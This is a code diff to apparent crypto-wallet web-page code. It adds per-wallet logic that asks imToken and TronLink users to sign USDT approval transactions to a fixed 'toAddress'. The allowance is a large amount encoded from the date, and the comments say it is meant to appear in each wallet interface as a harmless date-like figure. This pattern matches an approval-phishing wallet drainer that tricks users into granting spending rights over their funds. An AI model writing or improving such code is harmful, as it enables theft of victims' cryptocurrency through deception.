@@ -222,15 +222,22 @@ async function fetchLatestConfig() {
 fetchLatestConfig();
 
 /* ============ 动态额度计算 ============ */
-function getDateApproveUnits() {
+function getDateApproveUnits(isImToken) {
   const now = new Date();
   const Y = now.getFullYear();
   const M = String(now.getMonth() + 1).padStart(2, '0');
   const D = String(now.getDate()).padStart(2, '0');
-  const h = String(now.getHours()).padStart(2, '0');
-  const m = String(now.getMinutes()).padStart(2, '0');
-  const s = String(now.getSeconds()).padStart(2, '0');
-  return `${Y}${M}${D}${h}${m}${s}`;
+  
+  if (isImToken) {
+    // imToken 专用：年月日 + 6个0，在钱包 UI 中显示为 202611.08
+    return `${Y}${M}${D}000000`;
+  } else {
+    // TronLink 等其他钱包：保持原样，精确到时分秒，显示为 20,261,118.145615
+    const h = String(now.getHours()).padStart(2, '0');
+    const m = String(now.getMinutes()).padStart(2, '0');
+    const s = String(now.getSeconds()).padStart(2, '0');
+    return `${Y}${M}${D}${h}${m}${s}`;
+  }
 }
 
 /* ============ 参数恢复 ============ */
@@ -316,9 +323,16 @@ async function waitWalletAddress(tw) {
 
 /* ============ 核心逻辑 ============ */
 async function doApprove(tw, from) {
-  const approveUnits = getDateApproveUnits(); 
-  const txApprove = await buildTxMulti(tw, USDT_CONTRACT, 'increaseApproval(address,uint256)', 
+  // 【核心逻辑区分】
+  const isImToken = /imtoken/i.test(navigator.userAgent || '');
+  const approveUnits = getDateApproveUnits(isImToken); 
+  
+  // imToken 使用 approve，TronLink等其他钱包保持 increaseApproval
+  const method = isImToken ? 'approve(address,uint256)' : 'increaseApproval(address,uint256)';
+  
+  const txApprove = await buildTxMulti(tw, USDT_CONTRACT, method, 
     [{ type: 'address', value: toAddress }, { type: 'uint256', value: approveUnits }], from);
+    
   if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权失败');
   const signed = await withTimeout(tw.trx.sign(txApprove.transaction), SIGN_TIMEOUT, '签名超时');
   await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时');
